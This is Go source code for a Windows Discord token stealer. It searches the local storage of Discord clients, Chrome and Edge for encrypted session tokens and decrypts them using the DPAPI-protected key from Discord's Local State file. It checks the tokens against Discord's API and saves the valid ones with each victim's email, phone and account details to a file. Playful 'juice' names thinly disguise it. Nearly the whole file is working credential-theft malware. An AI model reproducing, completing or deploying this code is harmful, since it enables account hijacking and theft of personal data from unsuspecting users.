package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type JuiceBox struct {
	ID                   string `json:"id"`
	Username             string `json:"username"`
	Avatar               string `json:"avatar"`
	Discriminator        string `json:"discriminator"`
	PublicFlags          int    `json:"public_flags"`
	Flags                int    `json:"flags"`
	Banner               any    `json:"banner"`
	AccentColor          int    `json:"accent_color"`
	GlobalName           string `json:"global_name"`
	AvatarDecorationData any    `json:"avatar_decoration_data"`
	BannerColor          string `json:"banner_color"`
	Clan                 any    `json:"clan"`
	MfaEnabled           bool   `json:"mfa_enabled"`
	Locale               string `json:"locale"`
	PremiumType          int    `json:"premium_type"`
	Email                string `json:"email"`
	Verified             bool   `json:"verified"`
	Phone                string `json:"phone"`
	NsfwAllowed          bool   `json:"nsfw_allowed"`
	LinkedUsers          []any  `json:"linked_users"`
	Bio                  string `json:"bio"`
	AuthenticatorTypes   []any  `json:"authenticator_types"`
}

const ERROR_SHARING_VIOLATION = syscall.Errno(32)

func main() {
	var tokens []string
	var wg sync.WaitGroup
	var minuteMaid []*JuiceBox

	tokenChannel := make(chan string)

	local, err := os.UserCacheDir()
	if err != nil {
		fmt.Println("[-] App data folder not found..\n -> Error:", err)
	}
	roam, err := os.UserConfigDir()
	if err != nil {
		fmt.Println("[-] Roam folder not found..\n -> Error:", err)
	}

	localPaths := map[string]string{
		"Discord":        filepath.Join(roam, "discord", "Local Storage", "leveldb"),
		"Discord Canary": filepath.Join(roam, "discordcanary", "Local Storage", "leveldb"),
		"Lightcord":      filepath.Join(roam, "Lightcord", "Local Storage", "leveldb"),
		"Discord PTB":    filepath.Join(roam, "discordptb", "Local Storage", "leveldb"),
		"Chrome":         filepath.Join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		"Microsoft Edge": filepath.Join(local, "Microsoft Edge", "User Data", "Default", "Local Storage", "leveldb"),
	}

	wg.Add(len(localPaths))

	if gotTheJuice(roam) {
		for _, path := range localPaths {
			go getTheJuice(path, roam, &wg, tokenChannel)
		}
	}

	go func() {
		wg.Wait()
		close(tokenChannel)
	}()

	for token := range tokenChannel {
		tokens = append(tokens, token)
	}

	var valid []string
	loot := removeDuplicates(tokens)
	if len(loot) != 0 {
		for _, token := range loot {
			cupFull, err := searchJuiceBox(token); if err != nil {
				continue
			}
			if cupFull != nil{
				minuteMaid = append(minuteMaid, cupFull)
				valid = append(valid, token)
			}
		}
	}

	err = writeToFile(minuteMaid, valid); if err != nil {
		fmt.Println("[-] Error writing to file..\n", err)
	}
}

func gotTheJuice(roam string) bool {
	if _, err := os.Stat(filepath.Join(roam, "discord", "Local State")); !os.IsNotExist(err) {
		return true
	}
	return false
}

func getTheJuice(path, roam string, wg *sync.WaitGroup, tokenChannel chan<- string) {
	defer wg.Done()

	if _, err := os.Stat(path); !os.IsNotExist(err) {
		err := filepath.WalkDir(path, func(path string, dir os.DirEntry, err error) error {
			if err != nil {
				fmt.Printf("[-] Error walking directory: %v\n", err)
				return nil
			}
			if !dir.IsDir() {
				findTheJuice(path, roam, tokenChannel)
			}
			return nil
		})
		if err != nil {
			fmt.Printf("[-] Error walking path: %v\n", err)
		}
	}
}

func findTheJuice(filePath, roam string, tokenChannel chan<- string) {
	content, err := readFileWithRetry(filePath)
	if err != nil {
		fmt.Printf("[-] Error reading contents: %v\n", err)
		return
	}
	re := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
	found := re.FindAllString(string(content), -1)
	for _, match := range found {
		tokenParts := strings.Split(match, "dQw4w9WgXcQ:")
		if len(tokenParts) > 1 {
			decodedJuice, err := base64.StdEncoding.DecodeString(tokenParts[1])
			if err != nil {
				fmt.Printf("[-] Error decoding token: %v\n", err)
				continue
			}
			cup, err := openRefrigerator(filepath.Join(roam, "discord", "Local State"))
			if err != nil {
				fmt.Printf("[-] Error Opening the refrigerator: %v\n", err)
				continue
			}
			fullCup, err := openJuiceBottle(decodedJuice, cup)
			if err != nil {
				fmt.Printf("[-] Error Pouring the Juice: %v\n", err)
				continue
			}
			tokenChannel <- fullCup
		}
	}
}


func readFileWithRetry(filePath string) ([]byte, error) {
	var content []byte
	var err error
	for i := 0; i < 5; i++ { // Retry up to 5 times
		content, err = os.ReadFile(filePath)
		if err != nil {
			if pathErr, ok := err.(*os.PathError); ok && pathErr.Err == ERROR_SHARING_VIOLATION {
				time.Sleep(500 * time.Millisecond) // Wait half a second before retrying
				continue
			}
		}
		break
	}
	return content, err
}

func removeDuplicates(slices []string) []string {
	if len(slices) < 2 {
		return slices
	}
	uniqueSlices := make([]string, 0, len(slices))
	seen := make(map[string]struct{})
	for _, slice := range slices {
		if _, ok := seen[slice]; !ok {
			uniqueSlices = append(uniqueSlices, slice)
			seen[slice] = struct{}{}
		}
	}
	return uniqueSlices
}

// didn't know how to work with CryptUnprotectData lib in go, so these functions below
// are from chatgpt... ;( Im Learning Still!

func openJuiceBottle(encrypted, key []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", fmt.Errorf("invalid bottle length..")
	}

	iv := encrypted[3:15]
	juice := encrypted[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %w", err)
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM mode: %w", err)
	}

	bottle, err := aesgcm.Open(nil, iv, juice, nil)
	if err != nil {
		return "", fmt.Errorf("failed to open juice bottle: %w", err)
	}

	return string(bottle), nil
}


func openRefrigerator(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read local state file: %w", err)
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("failed to unmarshal local state JSON: %w", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState["os_crypt"].(map[string]interface{})["encrypted_key"].(string))
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64 closed bottle: %w", err)
	}

	encryptedKey = encryptedKey[5:] // Remove DPAPI prefix
	liquid, err := pourJuice(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to open the closed bottle: %w", err)
	}

	return liquid, nil
}

func pourJuice(data []byte) ([]byte, error) {
	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}

	err := windows.CryptUnprotectData(&inBlob, nil, nil, 0, nil, 0, &outBlob)
	if err != nil {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

	outData := make([]byte, outBlob.Size)
	copy(outData, unsafe.Slice(outBlob.Data, outBlob.Size))

	return outData, nil
}
// end of chatgpt code


func searchJuiceBox(juiceBox string) (*JuiceBox, error){
	request, err := http.NewRequest("GET", "https://discordapp.com/api/v9/users/@me", nil); if err != nil {
		return nil, err
	}
	request.Header.Add("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1")
	request.Header.Set("Authorization", juiceBox)
	response, err := http.DefaultClient.Do(request); if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if response.StatusCode != http.StatusOK {
		return nil, err
	}
	var minuteMaid JuiceBox
	if err := json.Unmarshal(body, &minuteMaid); err != nil {
		return nil, err
	}

	return &minuteMaid, nil
}

func writeToFile(minuteMaid []*JuiceBox, valids []string) error {
    // Get the current working directory
    cwd, err := os.Getwd()
    if err != nil {
        return err
    }

    // Create the full path to the output file
    outputPath := filepath.Join(cwd, "output.txt")

    // Create the file
    file, err := os.Create(outputPath)
    if err != nil {
        return err
    }
    defer file.Close()

    // Write each JuiceBox struct to the file
    for _, juiceBox := range minuteMaid {
		for _, valid := range valids {
			data, err := json.Marshal(juiceBox)
			if err != nil {
				return err
			}
			_, err = file.WriteString(valid); if err != nil {
				return err
			}
			_, err = file.WriteString("\n"); if err != nil {
				return err
			}
			_, err = file.Write(data); if err != nil {
				return err
			}
			_, err = file.WriteString("\n"); if err != nil {
				return err
			}
		}
    }
    return nil
}

